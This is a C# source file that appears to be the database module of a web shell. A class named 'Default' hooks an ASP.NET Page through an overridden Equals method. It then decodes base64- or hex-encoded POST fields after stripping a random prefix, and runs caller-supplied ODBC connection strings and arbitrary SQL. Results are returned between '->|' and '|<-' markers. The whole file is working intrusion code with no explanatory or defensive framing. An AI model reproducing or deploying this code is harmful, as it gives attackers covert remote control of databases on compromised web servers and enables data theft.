using System;
using System.Data;
using System.IO;
using System.Text;
using System.Web;
using System.Web.UI;

public class Default
{
    public HttpRequest Request;
    public HttpResponse Response;
    public String encoder;
    public String decoder;
    public String cs;
    public String randomPrefix;


    public override bool Equals(object obj)
    {
        Page page = (Page) obj;
        this.Response = page.Response;
        this.Request = page.Request;
        this.cs = "UTF-8";
        this.encoder = "base64";
        this.decoder = "";
        this.randomPrefix = "2";
        String tag_s = "->|";
        String tag_e = "|<-";
        this.Response.Charset = cs;
        String result = "";
        try
        {
            String action = (this.Request.Form["action"]);
            String conn = decode(this.Request.Form["conn"]);
            String z1 = decode(this.Request.Form["z1"]);
            String z2 = decode(this.Request.Form["z2"]);
            switch (action)
            {
                case "show_databases":
                    result += this.show_databases(conn);
                    break;
                case "show_tables":
                    result += this.show_tables(conn, z1);
                    break;
                case "show_columns":
                    result += this.show_columns(conn, z1, z2);
                    break;
                case "query":
                    result += this.query(conn, z1);
                    break;
                default:
                    break;
            }
        }
        catch (Exception e)
        {
            result = "ERROR:// " + e.Message;
        }

        this.Response.Write(tag_s + asoutput(result) + tag_e);
        return true;
    }

    public string show_databases(String conn)
    {
        String ret = "";
        System.Data.DataSet ds = new System.Data.DataSet();
        string sql = "show databases";
        using (System.Data.Odbc.OdbcDataAdapter dataAdapter =
            new System.Data.Odbc.OdbcDataAdapter(sql, conn))
        {
            dataAdapter.Fill(ds);
            ret = parseDataset(ds, "\t", "\t", false);
        }

        return ret;
    }

    public string show_tables(String conn, String dbname)
    {
        String ret = "";
        System.Data.DataSet ds = new System.Data.DataSet();
        string sql = "show tables from " + dbname;
        using (System.Data.Odbc.OdbcDataAdapter dataAdapter =
            new System.Data.Odbc.OdbcDataAdapter(sql, conn))
        {
            dataAdapter.Fill(ds);
            ret = parseDataset(ds, "\t", "\t", false);
        }

        return ret;
    }

    public string show_columns(String conn, String db, String table)
    {
        String ret = "";
        System.Data.DataSet ds = new System.Data.DataSet();
        string sql = "select * from " + db + "." + table + " limit 0,0";
        using (System.Data.Odbc.OdbcDataAdapter dataAdapter =
            new System.Data.Odbc.OdbcDataAdapter(sql, conn))
        {
            dataAdapter.Fill(ds);
            ret = parseDataset(ds, "\t", "", true);
        }

        return ret;
    }

    public string query(String conn, String sql)
    {
        String ret = "";
        System.Data.DataSet ds = new System.Data.DataSet();
        using (System.Data.Odbc.OdbcDataAdapter dataAdapter =
            new System.Data.Odbc.OdbcDataAdapter(sql, conn))
        {
            dataAdapter.Fill(ds);
            ret = parseDataset(ds, "\t|\t", "\r\n", true);
        }

        return ret;
    }

    public string parseDataset(DataSet ds, String columnsep, String rowsep, bool needcoluname)
    {
        if (ds == null || ds.Tables.Count <= 0)
        {
            return "Status" + columnsep + rowsep + "True" + columnsep + rowsep;
        }

        StringBuilder sb = new StringBuilder();
        if (needcoluname)
        {
            for (int i = 0; i < ds.Tables[0].Columns.Count; i++)
            {
                sb.AppendFormat("{0}{1}", ds.Tables[0].Columns[i].ColumnName, columnsep);
            }

            sb.Append(rowsep);
        }

        foreach (DataTable dt in ds.Tables)
        {
            foreach (DataRow dr in dt.Rows)
            {
                for (int i = 0; i < dr.Table.Columns.Count; i++)
                {
                    sb.AppendFormat("{0}{1}", ObjToStr(dr[i]), columnsep);
                }

                sb.Append(rowsep);
            }
        }

        return sb.ToString();
    }

    public string ObjToStr(object ob)
    {
        if (ob == null)
        {
            return string.Empty;
        }
        else
        {
            return ob.ToString();
        }
    }

    public String HexAsciiConvert(String hex)
    {
        StringBuilder sb = new StringBuilder();
        int i;
        for (i = 0; i < hex.Length; i += 2)
        {
            sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i, 2),
                System.Globalization.NumberStyles.HexNumber))));
        }

        return sb.ToString();
    }

    public String decode(String src)
    {
        int prefixlen = 0;
        try
        {
            prefixlen = Int32.Parse(randomPrefix);
            src = src.Substring(prefixlen);
        }
        catch (Exception e)
        {
        }

        String ret;
        try
        {
            switch (encoder)
            {
                case "base64":
                {
                    ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                    break;
                }
                case "hex":
                {
                    ret = HexAsciiConvert(src);
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }

    public String asoutput(String src)
    {
        String ret;
        try
        {
            switch (decoder)
            {
                case "base64":
                {
                    ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }
}